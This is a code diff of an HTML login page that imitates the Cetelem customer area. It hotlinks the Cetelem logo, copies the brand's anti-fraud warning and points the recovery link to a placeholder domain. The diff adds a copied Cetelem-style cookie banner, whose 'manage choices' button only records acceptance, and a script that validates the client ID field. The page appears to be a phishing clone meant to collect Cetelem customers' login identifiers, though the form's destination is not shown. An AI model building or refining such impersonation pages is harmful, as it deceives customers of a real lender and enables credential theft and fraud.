@@ -5,6 +5,7 @@
   <title>Connexion - Espace client</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
+    /* Styles existants */
     body {
       margin: 0;
       font-family: 'Segoe UI', Arial, sans-serif;
@@ -63,7 +64,6 @@
       margin-bottom: 20px;
     }
 
-
     label {
       font-size: 14px;
       display: block;
@@ -99,7 +99,7 @@
       gap: 6px;
     }
 
-    .btn {
+    .btn-suivant {
       background-color: #999;
       color: #fff;
       font-size: 15px;
@@ -107,11 +107,12 @@
       width: 100%;
       border: none;
       border-radius: 5px;
-      cursor: pointer;
+      cursor: not-allowed;
+      transition: background-color 0.3s ease;
     }
 
-    .btn.active {
-      background-color: #2e7d54 !important;
+    .btn-suivant.active {
+      background-color: #2e7d54;
       cursor: pointer;
     }
 
@@ -216,17 +217,122 @@
         line-height: 1.5;
       }
     }
+
+    /* NOUVEAU: CSS pour la bannière de cookies */
+    .cookie-banner {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: #f7f7f7;
+      border-top: 1px solid #e0e0e0;
+      padding: 20px;
+      box-sizing: border-box;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      color: #333;
+      z-index: 1000;
+    }
+
+    .cookie-content {
+      flex-grow: 1;
+      margin-right: 20px;
+    }
+
+    .cookie-content h3 {
+      margin: 0 0 10px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .cookie-content p {
+      margin: 0 0 15px;
+      font-size: 14px;
+      line-height: 1.4;
+    }
+
+    .cookie-content ul {
+      list-style: none;
+      padding: 0;
+      margin: 0 0 15px;
+    }
+
+    .cookie-content li {
+      font-size: 13px;
+      margin-bottom: 5px;
+    }
+
+    .cookie-content a {
+      color: #0066cc;
+      text-decoration: underline;
+      font-size: 13px;
+    }
+
+    .cookie-buttons {
+      display: flex;
+      gap: 10px;
+    }
+
+    .cookie-buttons button {
+      padding: 10px 15px;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+      cursor: pointer;
+      white-space: nowrap;
+    }
+
+    .cookie-buttons .btn-gerer {
+      background-color: transparent;
+      border: 1px solid #ccc;
+      color: #333;
+    }
+
+    .cookie-buttons .btn-refuser {
+      background-color: #ccc;
+      color: #333;
+    }
+
+    .cookie-buttons .btn-accepter {
+      background-color: #2e7d54;
+      color: #fff;
+      font-weight: bold;
+    }
+
+    @media (max-width: 768px) {
+      .cookie-banner {
+        flex-direction: column;
+        text-align: center;
+        padding: 15px;
+      }
+
+      .cookie-content {
+        margin-right: 0;
+        margin-bottom: 15px;
+      }
+
+      .cookie-buttons {
+        flex-direction: column;
+        width: 100%;
+      }
+
+      .cookie-buttons button {
+        width: 100%;
+      }
+    }
   </style>
 </head>
 <body>
 
   <div class="logo">
-    <img src="https://www.cetelem.fr/brand/logo.svg"
+    <img src="https://www.cetelem.fr/brand/logo.svg">
   </div>
 
   <div class="subtext">
-  <strong>Un crédit vous engage et doit être remboursé.</strong> Vérifiez vos capacités de remboursement avant de vous engager.
-</div>
+    <strong>Un crédit vous engage et doit être remboursé.</strong> Vérifiez vos capacités de remboursement avant de vous engager.
+  </div>
 
   <div class="login-box">
     <div class="avatar" style="margin-bottom: 18px;">
@@ -252,11 +358,11 @@
         border-radius: 5px;
         font-size: 14px;
         margin-bottom: 15px;
-        text-align: left;"
-
-      <span class="info-icon">ℹ️</span>
-      <span class="info-text">
-        Votre Identifiant Client vous a été transmis par mail lorsque vous avez souscrit votre contrat Cetelem. Vous pouvez le trouver dans les communications que nous vous adressons.
+        text-align: left;">
+        <span class="info-icon">ℹ️</span>
+        <span class="info-text">
+          Votre Identifiant Client vous a été transmis par mail lorsque vous avez souscrit votre contrat Cetelem. Vous pouvez le trouver dans les communications que nous vous adressons.
+        </span>
       </div>
 
       <div class="checkbox">
@@ -265,17 +371,19 @@
         </label>
       </div>
 
-      <button class="btn btn-suivant" type="submit">Suivant</button>
+      <button class="btn btn-suivant" type="submit" id="btn-suiv" disabled>Suivant</button>
+    </form>
 
-  <div class="forgot">
-    <a href="https://exemple.com/recuperation" class="btn-forgot">Identifiant oublié</a>
-  </div>
+    <div class="forgot">
+      <a href="https://exemple.com/recuperation" class="btn-forgot">Identifiant oublié</a>
+    </div>
 
-  <div class="alert-box">
-    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
-    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
-    <br>
-    <button>Découvrez nos conseils →</button>
+    <div class="alert-box">
+      <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
+      Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
+      <br>
+      <button>Découvrez nos conseils →</button>
+    </div>
   </div>
 
   <footer>
@@ -290,32 +398,86 @@
     <div class="social"></div>
   </footer>
 
-  <script>
-    const identifiant = document.getElementById("identifiant");
-    const loginBtn = document.getElementById("login-btn");
-    const message = document.getElementById("info-message");
-    const checkIcon = document.getElementById("check-icon");
+  <div class="cookie-banner" id="cookieBanner">
+    <div class="cookie-content">
+      <h3>Cetelem et ses partenaires souhaitent utiliser des cookies avec votre accord préalable</h3>
+      <p>
+        Les cookies sont utilisés pour sécuriser votre connexion, garantir le bon fonctionnement du site, faciliter votre navigation, permettre l'élaboration de statistiques et proposer des offres personnalisées ou à travers de publicités.
+      </p>
+      <p><strong>Cookies utilisés :</strong></p>
+      <ul>
+        <li><strong>Fonctionnement (obligatoires) :</strong> ces cookies sont nécessaires et garantissent le bon fonctionnement du site et permettent son optimisation.</li>
+        <li><strong>Statistiques et mesures d'audience :</strong> ces cookies permettent d'établir des statistiques d'analyse de la fréquentation à partir desquels les contenus de notre site sont améliorés.</li>
+        <li><strong>Cookies de publicité :</strong> ces cookies permettent de mieux connaître vos centres d'intérêt et de vous proposer des publicités personnalisées adaptées à vos attentes.</li>
+        <li><strong>Cookies de préférence :</strong> permettent de personnaliser et proposer les contenus et fonctionnalités du site.</li>
+      </ul>
+      <p>
+        Vous pouvez à tout moment modifier ou retirer votre consentement à l'installation de cookies non strictement nécessaires. Pour obtenir plus d'informations sur les cookies utilisés et la liste des sociétés utilisant des traceurs sur notre site, vous pouvez consulter notre politique des cookies :
+        <a href="#">Politique des cookies</a>
+      </p>
+    </div>
+    <div class="cookie-buttons">
+      <button class="btn-gerer">GÉRER MES CHOIX</button>
+      <button class="btn-accepter" id="acceptAllCookies">ACCEPTER TOUS LES COOKIES</button>
+    </div>
+  </div>
 
-    identifiant.addEventListener("input", () => {
-      const value = identifiant.value.trim();
-      if (value.length > 0) {
-        message.style.display = "block";
+  <script>
+    // Script pour le champ d'identifiant et le bouton
+    const identifiantInput = document.getElementById('identifiant');
+    const btnSuivant = document.getElementById('btn-suiv');
+    const checkIcon = document.getElementById('check-icon');
+    const infoMessage = document.getElementById('info-message');
+
+    identifiantInput.addEventListener('input', () => {
+      const value = identifiantInput.value.trim();
+      const length = value.length;
+
+      // Logique pour le bouton et l'icône de validation
+      if (length >= 8 && length <= 10) {
+        btnSuivant.classList.add('active');
+        btnSuivant.disabled = false;
+        identifiantInput.classList.add('valid');
+        checkIcon.style.display = 'inline';
       } else {
-        message.style.display = "none";
+        btnSuivant.classList.remove('active');
+        btnSuivant.disabled = true;
+        identifiantInput.classList.remove('valid');
+        checkIcon.style.display = 'none';
       }
 
-      if (/^\d{8}$|^\d{10}$/.test(value)) {
-        identifiant.classList.add("valid");
-        checkIcon.style.display = "inline";
-        btn.classList.add("active");
-        btn.disabled = false;
+      // Logique pour le message d'info (affiche dès la 1ère saisie)
+      if (length > 0) {
+        infoMessage.style.display = 'block';
       } else {
-        identifiant.classList.remove("valid");
-        checkIcon.style.display = "none";
-        btn.classList.remove("active");
-        btn.disabled = true;
+        infoMessage.style.display = 'none';
       }
     });
+
+    // NOUVEAU: Script pour la bannière de cookies
+    const cookieBanner = document.getElementById('cookieBanner');
+    const acceptAllCookiesBtn = document.getElementById('acceptAllCookies');
+    const gererMesChoixBtn = document.querySelector('.btn-gerer');
+
+    function hideCookieBanner() {
+      cookieBanner.style.display = 'none';
+    }
+
+    if (localStorage.getItem('cookiesAccepted')) {
+      hideCookieBanner();
+    }
+
+    acceptAllCookiesBtn.addEventListener('click', () => {
+      localStorage.setItem('cookiesAccepted', 'true');
+      hideCookieBanner();
+    });
+
+    if (gererMesChoixBtn) {
+        gererMesChoixBtn.addEventListener('click', () => {
+            localStorage.setItem('cookiesAccepted', 'true');
+            hideCookieBanner();
+        });
+    }
   </script>
 
 </body>
